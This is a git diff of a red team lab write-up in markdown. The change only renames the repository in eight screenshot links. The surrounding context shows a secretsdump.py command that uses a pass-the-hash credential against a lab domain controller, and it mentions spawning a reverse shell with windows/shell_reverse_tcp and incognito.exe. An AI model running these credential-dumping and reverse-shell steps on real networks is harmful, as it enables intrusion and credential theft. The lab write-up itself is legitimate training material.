@@ -416,14 +416,15 @@ Even more information I gathered using the -debug switch
 ```bash
 proxychains secretsdump.py -debug child.redteam.corp/child-admin@10.10.10.2 -hashes :dbac2b57a73bb883422658d2aea36967
 ```
-![Screenshot 2023-07-08 at 8 33 03 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/28e5d660-16b1-4491-8832-a12dabf62ff9)
-![Screenshot 2023-07-08 at 8 33 23 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/aebe1d64-4d6f-4543-aca8-da975d3431c9)
-![Screenshot 2023-07-08 at 8 33 46 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/53a0f654-aa77-4459-acea-137fff5265a4)
-![Screenshot 2023-07-08 at 8 34 51 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/31c97561-e9bf-4b7a-a3f5-d4d787e88423)
-![Screenshot 2023-07-08 at 8 35 44 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/5d006205-26cb-495b-b7a2-b60e6bf1ec01)
-![Screenshot 2023-07-08 at 8 36 17 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/93904dd9-550e-4468-8f76-5d20cf148f9d)
-![Screenshot 2023-07-08 at 8 37 06 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/faf5528a-4cd5-48b8-9a2e-7a57bd22223d)
-![Screenshot 2023-07-08 at 8 37 52 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/1702a323-aff8-420e-8bb9-edadb97f5995)
+![Screenshot 2023-07-08 at 8 33 03 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/2eb42b2b-0ba2-4211-aebc-0925fe4667a0)
+![Screenshot 2023-07-08 at 8 33 23 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/b5ff12fa-f7b4-4174-85f8-f01a0044f64f)
+![Screenshot 2023-07-08 at 8 33 46 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/bf2d40de-4719-4331-8746-f9898c4c2528)
+![Screenshot 2023-07-08 at 8 34 51 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/86cf4d92-e7e0-4fe2-a9d2-8de0f81d16db)
+![Screenshot 2023-07-08 at 8 35 44 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/62f0e418-f9e4-4e64-bdb3-69e10e8ecc2a)
+![Screenshot 2023-07-08 at 8 36 17 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/bd5e1676-9fb5-49a0-97a7-f3b331751ecb)
+![Screenshot 2023-07-08 at 8 37 06 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/57857be6-cbfc-4d7a-b19e-cdbe998676e3)
+![Screenshot 2023-07-08 at 8 37 52 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/1dbf824b-96ca-4eb5-981d-914dcdfb8f18)
+
 
 Moving further to our enumeration, I will use the windows/shell_reverse_tcp and incognito.exe to spawn a reverse shell from our attacking machine.
 
